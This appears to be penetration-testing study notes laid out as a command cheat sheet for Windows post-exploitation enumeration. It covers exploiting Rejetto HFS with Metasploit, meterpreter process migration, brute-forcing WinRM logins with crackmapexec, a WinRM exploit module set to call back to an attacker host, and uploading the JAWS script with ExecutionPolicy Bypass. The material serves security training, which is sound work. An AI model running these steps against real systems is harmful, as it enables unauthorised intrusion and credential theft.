# WINDOWS LOCAL ENUMERATION

```
WINDOWS LOCAL ENUMERATION


1. ENUMERATING SYSTEM INFORMATION - WINDOWS

	Initial Access
	
		> nmap scan
		> exploit rejetto_hfs_exec

		(Exploit target and gain meterpreter session)


	Basic Meterpreter Info
	
		> meterpreter> getuid
		> meterpreter> sysinfo
	
		getuid → Shows current user
		sysinfo → Displays OS details


	Drop to Shell
	
		> meterpreter> shell


	System Information
	
		C:\> hostname
		C:\> systeminfo
	
		hostname → Displays system name
		systeminfo → Full OS details, patches, architecture

		📌 Note:
		systeminfo also shows "Hotfix(s)" (installed updates)


	Detailed Patch Enumeration
	
		C:\> wmic qfe get Caption,Description,HotFixId,InstalledOn
	
		Shows:
		- Installed updates
		- Patch IDs
		- Installation dates


-------------------------------------------------------------------


2. ENUMERATING USERS & GROUPS

	Initial Steps
	
		> nmap scan
		> exploit rejetto_hfs_exec


	Meterpreter Enumeration
	
		> meterpreter> getuid
		> meterpreter> getprivs
		> meterpreter> background
	
		getprivs → Lists privileges of current user
		background → Send session to background


	Logged-on Users (Metasploit)
	
		> msf> search logged_on
		> msf> use windows/gather/enum_logged_on_users
		> msf> set SESSION 1
		> msf> run
		> msf> sessions 1


	Manual Enumeration
	
		> meterpreter> shell
	
		C:\> whoami /priv
		
		Shows privileges assigned to user


	Logged-in Users
	
		C:\> query user
		
		Lists currently logged-in users


	List All Users
	
		C:\> net users


	User Details
	
		C:\> net user administrator
		C:\> net user guest
		
		Displays complete details of the specified user account


	Groups Information
	
		C:\> net localgroup
		
		Lists all groups


	Administrator Group Members
	
		C:\> net localgroup administrators


-------------------------------------------------------------------


3. ENUMERATING NETWORK INFORMATION - WINDOWS

	Initial Steps
	
		> nmap scan
		> exploit rejetto


	Network Info
	
		> meterpreter> shell
	
		C:\> ipconfig
		C:\> ipconfig /all
	
		ipconfig → Basic network info
		ipconfig /all → Detailed network configuration


	Routing Table
	
		C:\> route print


	ARP Table
	
		C:\> arp -a
		
		Shows other devices on network


	Open Ports & Connections
	
		C:\> netstat -ano
		
		Lists:
		- Active connections
		- Listening ports
		- Process IDs


	Firewall Info
	
		C:\> netsh advfirewall firewall help
		
		Displays firewall command options


-------------------------------------------------------------------


4. ENUMERATING PROCESSES & SERVICES

	Initial Steps
	
		> nmap scan
		> exploit rejetto


	Process Enumeration
	
		> meterpreter> ps
		
		List running processes


	Find Specific Process
	
		> meterpreter> pgrep explorer.exe
		
		Returns Process ID (PID)


	Process Migration
	
		> meterpreter> migrate 2176
		
		Migrates to stable process (helps persistence)


	Service Enumeration
	
		> meterpreter> shell
		
		C:\> net start
		
		Lists running services


	Detailed Services
	
		C:\> wmic service list brief


	Services with Process Mapping
	
		C:\> tasklist /SVC
		
		Lists all running processes along with the Windows services associated with each process.
		Helps you see which service is running under which process (PID)


	Scheduled Tasks
	
		C:\> schtasks /query /fo LIST /v
		
		Lists scheduled tasks (useful for persistence)


-------------------------------------------------------------------


5. AUTOMATING WINDOWS LOCAL ENUMERATION

	WinRM Detection
	
		> nmap -sV -p5985 target_ip
		
		5985 → WinRM port


	Credential Brute Force (WinRM)
	
		> crackmapexec winrm ip_addr -u username_or_wordlist -p password_or_wordlists
		
		Example:
		> crackmapexec winrm ip_addr -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt


	Metasploit WinRM Access
	
		> msf> search winrm
		> msf> use /windows/winrm/winrm_script_exec
		> msf> set FORCE_VBS true
		> msf> set USERNAME username
		> msf> set PASSWORD password
		> msf> set RHOSTS target_ip
		> msf> set RPORT 5985
		> msf> set LHOST attacker_ip
		> msf> set LPORT attacker_port
		> msf> exploit
	
		📌 If session not created:
		> msf> run


	Post-Exploitation Modules
	
		> meterpreter> getuid
		> meterpreter> background


	Privileges Enumeration
	
		> msf> search win_privs
		> msf> use windows/gather/win_privs
		> msf> set SESSION 1
		> msf> run


	Logged-on Users
	
		> msf> search logged_on
		> msf> use windows/gather/enum_logged_on_users
		> msf> set SESSION 1
		> msf> run


	VM Detection
	
		> msf> search checkvm
		> msf> use windows/gather/checkvm
		> msf> set SESSION 1
		> msf> run


	Installed Applications
	
		> msf> search enum_application
		> msf> use windows/gather/enum_applications
		> msf> set SESSION 1
		> msf> run


	Domain Computers
	
		> msf> search enum_computer
		> msf> use windows/gather/enum_computers
		> msf> set SESSION 1
		> msf> run
		
		(Enumerates systems in Active Directory domain)


	Patch Enumeration
	
		> msf> search enum_patch
		> msf> use windows/gather/enum_patches
		> msf> set SESSION 1
		> msf> run


	Shared Resources
	
		> msf> search enum_shares
		> msf> use windows/gather/enum_shares
		> msf> set SESSION 1
		> msf> run


-------------------------------------------------------------------


6. AUTOMATED ENUMERATION USING JAWS

	JAWS GitHub
	
		> https://github.com/411Hall/JAWS.git


	Upload Script to Target
	
		> meterpreter> cd C:\
		> meterpreter> mkdir temp
		> meterpreter> cd temp
		> meterpreter> upload jaws_enum.ps1


	Run PowerShell Script
	
		> meterpreter> shell
		
		C:\> powershell.exe -ExecutionPolicy Bypass -File .\jaws_enum.ps1 -OutputFilename jaws-enum.txt
		
		-ExecutionPolicy Bypass → Allows execution of PowerShell scripts
		(Default Windows blocks script execution)


	Stop Execution
	
		C:\> ^C


	Download Results
	
		> meterpreter> download jaws-enum.txt


	View Results
	
		> vim jaws-enum.txt
```
